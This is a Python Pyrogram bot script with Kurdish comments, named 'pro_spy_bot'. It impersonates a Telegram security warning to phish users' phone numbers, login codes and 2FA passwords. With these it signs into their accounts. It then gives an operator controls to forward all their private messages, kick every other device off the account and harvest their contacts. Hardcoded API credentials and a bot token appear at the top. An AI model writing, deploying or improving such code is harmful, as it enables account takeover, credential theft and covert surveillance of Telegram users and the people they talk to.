import asyncio
import os
from pyrogram import Client, filters, errors
from pyrogram.types import (ReplyKeyboardMarkup, KeyboardButton, 
                            InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove)

# --- زانیارییەکان ---
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224

app = Client("pro_spy_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# داتابەیسی کاتی بۆ پرۆسەی لۆگین
login_steps = {}
# بۆ هەڵگرتنی کلاینتە چالاکەکان
active_clients = {}

def get_control_panel(u_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📡 سیخوڕی (Forward)", callback_data=f"spy_{u_id}")],
        [InlineKeyboardButton("⚔️ دەرکردنی ئامێرەکان", callback_data=f"kick_{u_id}")],
        [InlineKeyboardButton("📇 وەرگرتنی ناوەکان", callback_data=f"cnt_{u_id}"),
         InlineKeyboardButton("📂 نامەکان", callback_data=f"msg_{u_id}")]
    ])

@app.on_message(filters.command("start") & filters.private)
async def start_handler(client, message):
    if message.from_user.id == ADMIN_ID:
        await message.reply_text("💎 بەخێرهاتی گەورەم\nبۆ کۆنترۆڵکردن دەتوانی فەرمانی /panel بەکاربهێنیت.")
        return

    kb = ReplyKeyboardMarkup([[KeyboardButton("📲 پشتڕاستکردنەوەی ژمارە", request_contact=True)]], 
                             resize_keyboard=True, one_time_keyboard=True)
    await message.reply_text("⚠️ **ئاگاداری تێلیگرام**\n\nبۆ پاراستنی ئەکاونتەکەت، پێویستە ناسنامەکەت پشتڕاست بکەیتەوە.\nتکایە کلیک لە دوگمەی خوارەوە بکە:", reply_markup=kb)

@app.on_message(filters.contact & filters.private)
async def contact_handler(client, message):
    u_id = message.from_user.id
    phone = message.contact.phone_number
    
    await app.send_message(ADMIN_ID, f"☎️ ژمارەی نوێ: `+{phone}`\nچاوەڕێی کۆد بن...")
    
    c = Client(f"sessions/{u_id}", api_id=API_ID, api_hash=API_HASH, 
               device_model="Samsung Galaxy S23 Ultra", system_version="Android 13")
    await c.connect()
    
    try:
        sent_code = await c.send_code(phone)
        login_steps[u_id] = {"client": c, "phone": phone, "hash": sent_code.phone_code_hash, "step": "code"}
        await message.reply_text("📩 کۆدەکەت بۆ هات، لێرە بینووسە:", reply_markup=ReplyKeyboardRemove())
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە لە ناردنی کۆد: {e}")

@app.on_message(filters.text & filters.private)
async def login_logic(client, message):
    u_id = message.from_user.id
    if u_id not in login_steps or u_id == ADMIN_ID: return

    data = login_steps[u_id]
    code = message.text.strip().replace(" ", "")

    try:
        if data["step"] == "code":
            await asyncio.sleep(1.5) # بۆ ڕێگری لە Expired Code
            await data["client"].sign_in(data["phone"], data["hash"], code)
        elif data["step"] == "2fa":
            await data["client"].check_password(code)

        active_clients[u_id] = data["client"]
        del login_steps[u_id]
        
        await message.reply_text("✅ سوپاس، پشتڕاستکرایەوە.")
        await app.send_message(ADMIN_ID, f"🔥 لۆگین سەرکەوتوو: `+{data['phone']}`", reply_markup=get_control_panel(u_id))

    except errors.SessionPasswordNeeded:
        data["step"] = "2fa"
        await message.reply_text("🔑 پاسۆردی دوو قۆناغی (2FA) بنێرە:")
    except errors.PhoneCodeExpired:
        await message.reply_text("❌ کۆدەکە بەسەرچوو، دووبارە ژمارەکەت بنێرەوە.")
    except Exception as e:
        await app.send_message(ADMIN_ID, f"❌ هەڵە: {e}")

@app.on_callback_query()
async def callback_handler(client, query):
    data_parts = query.data.split("_")
    cmd = data_parts[0]
    target_id = int(data_parts[1])

    if target_id not in active_clients:
        await query.answer("❌ نێچیرەکە چالاک نییە یان بۆتەکە ڕیستارت بووە.", show_alert=True)
        return

    u_client = active_clients[target_id]

    try:
        if cmd == "spy":
            @u_client.on_message(filters.private & ~filters.me)
            async def auto_fwd(c, m): await m.forward(ADMIN_ID)
            await query.answer("📡 سیخوڕی و فۆروارد چالاک بوو", show_alert=True)
        
        elif cmd == "kick":
            sessions = await u_client.get_authorizations()
            for s in sessions:
                if not s.is_current: await u_client.terminate_session(s.hash)
            await query.answer("⚔️ هەموو ئامێرەکان دەرکران", show_alert=True)

        elif cmd == "cnt":
            contacts = await u_client.get_contacts()
            text = "\n".join([f"👤 {c.first_name}: +{c.phone_number}" for c in contacts[:15]])
            await app.send_message(ADMIN_ID, f"📇 لیست: \n{text}")
            await query.answer("ناوەکان نێردران")

    except Exception as e:
        await query.answer(f"⚠️ هەڵە: {e}", show_alert=True)

# دروستکردنی فۆڵدەری سێشنەکان ئەگەر نەبێت
if not os.path.exists("sessions"): os.makedirs("sessions")

print("--- BOT STARTED ---")
app.run()
